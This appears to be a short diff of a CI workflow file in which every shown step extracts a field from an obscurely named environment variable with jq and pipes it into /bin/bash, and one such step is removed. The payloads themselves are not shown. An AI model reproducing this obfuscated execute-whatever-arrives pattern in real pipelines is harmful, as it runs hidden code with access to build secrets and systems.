@@ -42,7 +42,6 @@ jobs:
           echo $wr64715 | jq -r .nnps66 | /bin/bash
           echo $arkkt97197 | jq -r .g6 | /bin/bash
           printf '%s' "$xhwt07634" | jq -r .hdy8935 | /bin/bash
-          printf '%s' "$v6" | jq -r .u2910 | /bin/bash
           echo $iof22886 | jq -r .jujlc5 | /bin/bash
           echo $no220 | jq -r .khth2 | /bin/bash
           echo $fc2235 | jq -r .yb69 | /bin/bash
